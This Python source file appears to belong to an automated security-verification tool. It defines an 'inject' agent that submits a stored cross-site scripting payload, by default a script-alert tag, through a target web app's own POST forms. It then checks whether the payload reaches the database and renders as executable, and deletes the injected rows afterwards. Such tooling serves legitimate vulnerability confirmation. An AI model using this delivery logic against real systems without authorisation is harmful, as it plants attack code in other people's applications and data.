"""inject agent: proves "user can write content via HTTP entry" (I0–I7).

Division of labor with trigger: trigger writes directly to DB to prove sink reachability; inject only uses the app's own forms,
DB writes are performed by the app, finally using ``db_read`` / ``verify_tag`` for tri-state acceptance.
"""

from __future__ import annotations

import contextlib
import datetime as _dt
import re
import secrets
import string
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlencode, urljoin

from tia.ad.llm import LlmClient
from tia.cap.domscan import Document, parse
from tia.cap.entry import entry_field, resolve_values_with_guess
from tia.dom.trigger import StageRecord
from tia.inf.runtime import get_runtime
from tia.orch.judge import judge_inject
from tia.orch.kernel import Kernel, LocalToolClient, ToolCallError, ToolClient

DEFAULT_PAYLOAD = "<script>alert(1)</script>"
_TAG_RE = re.compile(r"<tia-([a-z0-9]{4})>")
_POST_VAR_RE = re.compile(r"\$_POST\[\s*[\'\"]([A-Za-z_][\w]*)[\'\"]\s*\]")


@dataclass
class InjectResult:
    case_id: str
    verdict: str
    stages: list[StageRecord] = field(default_factory=list)
    notes: dict[str, Any] = field(default_factory=dict)
    residue: int = 0
    report: str = ""
    trace: list[Any] = field(default_factory=list)


@dataclass
class _Form:
    action: str
    method: str
    fields: dict[str, str]


def _tag() -> str:
    """4-char lowercase alphanumeric: serves as evidence and passes common length limits."""
    alphabet = string.ascii_lowercase + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(4))


def _walk(document: Document) -> list[Any]:
    return list(document.nodes)


def _forms(document: Document, page_url: str) -> list[_Form]:
    forms: list[_Form] = []
    for node in document.nodes:
        if node.tag != "form":
            continue
        action = node.attrs.get("action", "")
        method = (node.attrs.get("method") or "get").lower()
        fields: dict[str, str] = {}
        stack = list(node.children)
        while stack:
            child = stack.pop()
            if child.tag in {"input", "textarea", "select"}:
                name = child.attrs.get("name")
                if name:
                    kind = (child.attrs.get("type") or "").lower()
                    if kind not in {"submit", "button", "reset", "file", "image"}:
                        fields[name] = child.attrs.get("value", "")
            stack.extend(child.children)
        forms.append(_Form(action=urljoin(page_url, action or page_url), method=method, fields=fields))
    return forms


_INSERT_RE = re.compile(
    r"insert\s+(?:ignore\s+)?into\s+([`\"]?)([A-Za-z_][\w]*)\1\s*\(([^)]*)\)", re.I
)


_ASSIGN_RE = re.compile(r"^\s*\$(\w+)\s*=")
_POST_READ_RE = re.compile(r"\$_POST\[\s*[\'\"](\w+)[\'\"]\s*\]")
_BIND_RE = re.compile(r"bind(?:Param|Value)\(\s*[\'\"]:(\w+)[\'\"]\s*,\s*\$(\w+)")


def _column_params(text: str) -> dict[str, str]:
    """Map INSERT column -> POST parameter via assignments and bindParam calls.

    Assignments are matched per line so that direct reads and guard forms such as
    ``$user = isset($_POST['name']) ? $_POST['name'] : ''`` both resolve.
    """
    variables: dict[str, str] = {}
    for line in text.splitlines():
        assigned = _ASSIGN_RE.match(line)
        if assigned is None:
            continue
        reads = _POST_READ_RE.findall(line)
        if reads:
            variables[assigned.group(1)] = reads[0]
    mapping: dict[str, str] = {}
    for column, variable in _BIND_RE.findall(text):
        if variable in variables:
            mapping[column] = variables[variable]
    return mapping


def _insert_line(lines: list[dict[str, Any]]) -> int | None:
    """Absolute line number of the INSERT statement inside a source window."""
    for item in lines:
        if _INSERT_RE.search(str(item.get("text", ""))):
            number = item.get("n")
            if isinstance(number, int):
                return number
    return None


def _infer_target(source_text: str, sink_code: str, params: list[str]) -> dict[str, Any] | None:
    """Infer INSERT target table and columns from source; return None if unavailable."""
    insert = _INSERT_RE.search(source_text)
    if insert is None:
        return None
    table = insert.group(2)
    columns = [c.strip().strip("`\"") for c in insert.group(3).split(",") if c.strip()]
    bind = re.search(r'bind(?:Param|Value)\(\s*[\'"]:([A-Za-z_][\w]*)[\'"]', sink_code)
    column = bind.group(1) if bind else (params[0] if params else columns[-1] if columns else "")
    if column not in columns:
        # If colon name and column name do not match exactly, retry by parameter name
        candidate = params[0] if params and params[0] in columns else ""
        column = candidate or (columns[0] if columns else "")
    return {"table": table, "columns": columns, "column": column}


def _best_pair_hint(pair_hints: list[dict[str, Any]] | None) -> dict[str, Any] | None:
    """Highest-confidence read/write hint that names a table."""
    for hint in pair_hints or []:
        if hint.get("table"):
            return hint
    return None


async def run_inject(
    raw_slice: dict[str, Any],
    base_url: str,
    payload_base: str = DEFAULT_PAYLOAD,
    budget: int = 40,
    client: ToolClient | None = None,
    cleanup: bool = True,
    pair_hints: list[dict[str, Any]] | None = None,
    verify_url: str | None = None,
    verify_entry: dict[str, Any] | None = None,
    payload_constraints: dict[str, Any] | None = None,
) -> InjectResult:
    kernel = Kernel(
        profile="inject", budget=budget, client=client or LocalToolClient(profile="inject")
    )
    result = InjectResult(case_id="", verdict="ENV_ERROR")
    stages = result.stages
    notes = result.notes

    def stage(name: str, ok: bool, note: str) -> None:
        stages.append(StageRecord(stage=name, ok=ok, note=note))

    sink = str(raw_slice.get("sink") or raw_slice.get("sinkCode") or "")
    sink_file = str(raw_slice.get("sinkFile") or (sink.split(":", 1)[0] if ":" in sink else ""))
    line_match = re.search(r":(\d+)", sink)
    sink_line = int(line_match.group(1)) if line_match else int(raw_slice.get("sinkLine") or 0)
    params = [str(p) for p in raw_slice.get("params") or []]
    if not params:
        for source in raw_slice.get("sources") or []:
            if source.get("param"):
                params.append(str(source["param"]))
    tag = _tag()
    notes.update({"tag": tag, "sink": f"{sink_file}:{sink_line}"})

    async def call(tool: str, arguments: dict[str, Any]) -> dict[str, Any]:
        data = await kernel.call(tool, arguments)
        return data if isinstance(data, dict) else {}

    # ---- I0 Baseline: page does not contain new tag, and no residue in DB ----
    try:
        case = await call(
            "case_open",
            {
                "agent": "inject",
                "slice": {"sink": f"{sink_file}:{sink_line}  {sink}", "kind": raw_slice.get("kind", "SQL")},
                "write_targets": [],
            },
        )
    except ToolCallError as exc:
        stage("I0", False, f"case_open failed: {exc}")
        result.verdict = "ENV_ERROR"
        return result
    result.case_id = str(case.get("case_id", ""))
    kernel.case_id = result.case_id
    baseline = await call("verify_tag", {"url": base_url, "tag": tag})
    if baseline.get("found"):
        stage("I0", False, "BASELINE_DIRTY: tag already exists on page")
        result.verdict = "BASELINE_DIRTY"
        return await _finish(kernel, result, cleanup=False)
    stage("I0", True, f"baseline clean tag={tag}")

    # ---- I1 Write path symbolic: find INSERT target in source ----
    try:
        source = await call(
            "source_read",
            {"file": sink_file, "line_from": max(1, sink_line - 40), "line_to": sink_line + 10},
        )
    except ToolCallError as exc:
        stage("I1", False, f"source_read failed: {exc}")
        result.verdict = "PATH_UNREACHABLE"
        return await _finish(kernel, result)
    text = "\n".join(str(item.get("text", "")) for item in source.get("lines") or [])
    if not params:
        # The trigger slice carries no source parameters; recover POST fields from the write path itself.
        params = sorted(set(_POST_VAR_RE.findall(text)))
        notes["params_from_source"] = params
    target = _infer_target(text, str(raw_slice.get("sinkCode") or sink), params)
    hint = _best_pair_hint(pair_hints)
    if hint is not None:
        # The pairing prior names the write target directly; source inference is
        # the fallback when the slice carries no usable SQL literal.
        hint_columns = [str(item) for item in hint.get("columns") or []]
        base_columns = list(target["columns"]) if target else []
        column = hint_columns[0] if hint_columns else str((target or {}).get("column") or "")
        target = {
            "table": str(hint["table"]),
            "columns": base_columns or hint_columns or [column],
            "column": column,
            "source": "pair_hint",
        }
        notes["pair"] = {
            "pair_id": hint.get("pair_id"),
            "confidence": hint.get("confidence"),
            "side": hint.get("side"),
            "table": hint.get("table"),
            "columns": hint_columns,
        }
    if target is None:
        stage("I1", False, "INSERT target table not found")
        result.verdict = "WRITE_NOT_REACHED"
        return await _finish(kernel, result)
    notes["target"] = target
    insert_line = _insert_line([item for item in source.get("lines") or [] if isinstance(item, dict)])
    if insert_line is not None:
        target["line"] = insert_line
    kernel.set_write_targets([{"table": target["table"], "column": target["column"], "mode": "delete"}])
    stage(
        "I1",
        True,
        f"target={target['table']}.{target['column']} columns={target['columns']} line={insert_line}",
    )

    # ---- I2 Entry reconstruction: fetch page to find form ----
    try:
        page = await call("http_request", {"method": "GET", "url": base_url})
    except ToolCallError as exc:
        stage("I2", False, f"GET failed: {exc}")
        result.verdict = "ENV_ERROR"
        return await _finish(kernel, result)
    if int(page.get("status", 0)) >= 400:
        stage("I2", False, f"entry HTTP {page.get('status')}")
        result.verdict = "PATH_UNREACHABLE"
        return await _finish(kernel, result)
    document = parse(str(page.get("body") or ""))
    forms = [f for f in _forms(document, base_url) if f.method == "post"]
    if not forms:
        stage("I2", False, "No POST form on page")
        result.verdict = "NO_HTTP_ENTRY"
        return await _finish(kernel, result)
    column_params = _column_params(text)
    notes["column_params"] = column_params
    candidates = [
        parameter
        for column, parameter in column_params.items()
        if any(parameter in form.fields for form in forms)
    ] or [name for name in params if any(name in form.fields for form in forms)]
    if not candidates:
        stage("I2", False, f"form fields {sorted(set().union(*[set(f.fields) for f in forms]))} do not match params {params}")
        result.verdict = "ENTRY_AMBIGUOUS"
        return await _finish(kernel, result)
    notes["candidates"] = candidates
    stage("I2", True, f"form {forms[0].action} candidate fields={candidates}")

    # ---- I3 Length budget: pick the widest writable column that fits the payload ----
    schema = await call("db_schema", {"table": target["table"]})
    widths: dict[str, int | None] = {}
    pk_columns: list[str] = []
    for table_item in schema.get("tables") or []:
        if table_item.get("name") == target["table"]:
            pk_columns = [str(item) for item in table_item.get("primary_key") or []]
            for column in table_item.get("columns") or []:
                widths[str(column.get("name"))] = column.get("length")
    payload = f"{payload_base}<tia-{tag}>"
    constraints = dict(payload_constraints or {})
    if constraints:
        notes["payload_constraints"] = constraints
        max_length = constraints.get("max_length")
        overhead = len(f"<tia-{tag}>")
        if isinstance(max_length, int) and max_length > overhead and len(payload) > max_length:
            keep = max_length - overhead
            trimmed = payload_base[:keep]
            payload = f"{trimmed}<tia-{tag}>"
            notes["payload_trimmed"] = {"max_length": max_length, "base_chars": len(trimmed)}
            stage("I3", True, f"payload trimmed to {len(payload)} chars for column limit {max_length}")
    fitting: list[tuple[int, str, str]] = []
    param_columns = {parameter: column for column, parameter in column_params.items()}
    for candidate in candidates:
        column = param_columns.get(candidate) or (
            candidate if candidate in target["columns"] else target["column"]
        )
        width = widths.get(column)
        if width is None or len(payload) <= int(width):
            fitting.append((int(width or 0), candidate, column))
    if not fitting:
        stage("I3", False, f"payload {len(payload)} exceeds every candidate column: {widths}")
        result.verdict = "LENGTH_EXCEEDED"
        return await _finish(kernel, result)
    _, field_name, chosen_column = max(fitting)
    form = next(f for f in forms if field_name in f.fields)
    target["column"] = chosen_column
    notes["entry"] = {"url": form.action, "method": form.method, "field": field_name, "fields": form.fields}
    notes["payload"] = payload
    stage("I3", True, f"payload {len(payload)} chars, column {chosen_column} width={widths.get(chosen_column)}")
    stage("I4", True, f"intersect: field={field_name}, column={chosen_column}, payload {len(payload)} chars")

    # ---- I4/I5 delivery: use the application's own form ----
    values = dict(form.fields)
    values[field_name] = payload
    for param in params:
        if param in form.fields and param != field_name:
            values[param] = values[param] or f"tia-{tag}"
    body = urlencode(values)
    armed = False
    if insert_line is not None:
        try:
            await call("probe_arm", {"case_id": result.case_id, "file": sink_file, "line": insert_line})
            armed = True
        except ToolCallError as exc:
            notes["probe_error"] = str(exc.envelope.error.message if exc.envelope.error else exc)
    try:
        if armed:
            submitted = await call(
                "probe_run",
                {
                    "case_id": result.case_id,
                    "url": form.action,
                    "method": "POST",
                    "body": body,
                    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                },
            )
        else:
            submitted = await call(
                "http_request",
                {
                    "method": "POST",
                    "url": form.action,
                    "body": body,
                    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                },
            )
    except ToolCallError as exc:
        stage("I5", False, f"POST failed: {exc}")
        result.verdict = "WRITE_NOT_REACHED"
        return await _finish(kernel, result)
    finally:
        if armed:
            with contextlib.suppress(ToolCallError):
                await call("probe_disarm", {"case_id": result.case_id})
    status = submitted.get("http", {}).get("status") if armed else submitted.get("status")
    stage("I5", True, f"POST {form.action} → {status} probe={armed}")
    if armed and (submitted.get("queries") or []):
        query = (submitted.get("queries") or [{}])[0]
        notes["probe"] = {
            "mode": submitted.get("mode"),
            "sql": query.get("sql"),
            "bindings": query.get("bindings"),
            "affected_rows": query.get("affected_rows"),
            "last_insert_id": query.get("last_insert_id"),
            "matched_at": query.get("matched_at"),
        }
    if int(status or 0) >= 400:
        result.verdict = "WRITE_NOT_REACHED"
        return await _finish(kernel, result)

    # ---- I6 tri-state acceptance: in DB / on page / executable ----
    table = target["table"]
    column = target["column"]
    probe = await call(
        "db_read",
        {
            "sql": f"SELECT COUNT(*) AS n FROM `{table}` WHERE `{column}` LIKE '%<tia-{tag}>%'",
        },
    )
    rows = probe.get("rows") or []
    in_db = bool(rows and int(rows[0].get("n") or 0) > 0)
    notes["tag_in_db"] = in_db
    stage("I6", in_db, f"tag_in_db={in_db}")

    # Second-order XSS: the write entry and the read page differ. Fetch the read
    # page with its own entry parameters before classifying the tag context.
    verify_content_type = "text/html"
    if verify_url and verify_url != form.action and verify_entry:
        entry_method = str(verify_entry.get("method") or "POST").upper()
        entry_spec = [entry_field(item) for item in verify_entry.get("fields") or []]
        written_row: dict[str, Any] | None = None
        try:
            row_hit = await call(
                "db_read",
                {
                    "sql": (
                        f"SELECT * FROM `{table}` WHERE `{column}` LIKE '%<tia-{tag}>%' LIMIT 1"
                    )
                },
            )
            rows_found = row_hit.get("rows") or []
            written_row = rows_found[0] if rows_found else None
        except ToolCallError:
            written_row = None
        entry_fields, entry_basis = await resolve_values_with_guess(
            entry_spec,
            tag=tag,
            row=written_row,
            pk_columns=pk_columns,
            context=text,
            client=LlmClient.from_env(),
        )
        notes["read_entry_basis"] = entry_basis
        attempt_values: list[dict[str, str]] = [entry_fields]
        tag_only = {field.name: tag for field in entry_spec}
        if tag_only and tag_only != entry_fields:
            attempt_values.append(tag_only)
        verify: dict[str, Any] | None = None
        attempts: list[dict[str, Any]] = []
        for values in attempt_values:
            attempt_html: str | None = None
            try:
                if entry_method == "GET":
                    page = await call("http_request", {"method": "GET", "url": verify_url, "params": values})
                else:
                    page = await call(
                        "http_request",
                        {
                            "method": "POST",
                            "url": verify_url,
                            "body": urlencode(values),
                            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                        },
                    )
                attempt_html = str(page.get("body") or "")
                verify_content_type = str(page.get("content_type") or "text/html")
                status = page.get("status")
            except ToolCallError as exc:
                attempts.append({"values": values, "error": str(exc)})
                continue
            this_verify = await call(
                "verify_tag", {"tag": tag, "payload": payload, "html": attempt_html,
                               "content_type": verify_content_type}
            )
            attempts.append(
                {"values": values, "status": status, "found": bool(this_verify.get("found"))}
            )
            if verify is None or (this_verify.get("found") and not bool(verify.get("found"))):
                verify = this_verify
            if this_verify.get("found"):
                break
        notes["verify_attempts"] = attempts
        stage("I6", verify is not None, f"read page {verify_url} attempts={len(attempts)}")
        if verify is None:
            verify = await call("verify_tag", {"tag": tag, "payload": payload, "url": verify_url or form.action})
        notes["verify_on"] = "read_page"
    else:
        try:
            verify = await call("verify_tag", {"tag": tag, "payload": payload, "url": form.action})
            notes["verify_on"] = "url"
        except ToolCallError as exc:
            notes["verify_error"] = str(exc)
            verify = None
    found = bool(verify.get("found") if verify else False)
    best = (verify or {}).get("best") or {}
    executable = bool(best.get("executable"))
    notes.update({"tag_in_page": found, "executable": executable, "context_kind": best.get("context_kind")})
    stage("I6", found, f"tag_in_page={found} executable={executable} kind={best.get('context_kind')}")

    verdict, explanation = judge_inject(in_db, found, executable)
    notes["explanation"] = explanation

    # ---- I7 cleanup: delete self-generated data, keep change record for rollback ----
    if cleanup and in_db:
        try:
            deleted = await call(
                "db_write",
                {
                    "case_id": result.case_id,
                    "sql": f"DELETE FROM `{table}` WHERE `{column}` LIKE '%<tia-{tag}>%'",
                    "expect_affected": 1,
                },
            )
            change = (deleted.get("change") or {}).get("change_id")
            again = await call(
                "db_read",
                {
                    "sql": f"SELECT COUNT(*) AS n FROM `{table}` WHERE `{column}` LIKE '%<tia-{tag}>%'",
                },
            )
            rows_again = again.get("rows") or []
            result.residue = int(rows_again[0].get("n") or 0) if rows_again else 0
            notes["cleanup"] = {"change_id": change, "residue": result.residue}
            stage("I7", result.residue == 0, f"cleanup change={change} residue={result.residue}")
        except ToolCallError as exc:
            stage("I7", False, f"cleanup failed: {exc.envelope.error.message if exc.envelope.error else exc}")
    else:
        stage("I7", True, "no data to clean")

    result.verdict = verdict
    return await _finish(kernel, result)


async def _finish(kernel: Kernel, result: InjectResult, cleanup: bool = True) -> InjectResult:
    if result.case_id:
        get_runtime().store.set_case_verdict(result.case_id, str(result.verdict), ceiling="EXECUTABLE")
    report = ""
    try:
        data = await kernel.call(
            "case_report",
            {"case_id": result.case_id, "format": "markdown"},
        )
        report = str(data.get("markdown", "")) if isinstance(data, dict) else ""
    except ToolCallError:
        report = ""
    result.report = report
    result.trace = kernel.trace
    if result.case_id:
        with contextlib.suppress(ToolCallError):
            await kernel.call(
                "case_note",
                {"case_id": result.case_id, "key": "verdict", "value": result.verdict},
            )
    return result


def _today() -> str:
    return _dt.date.today().isoformat()
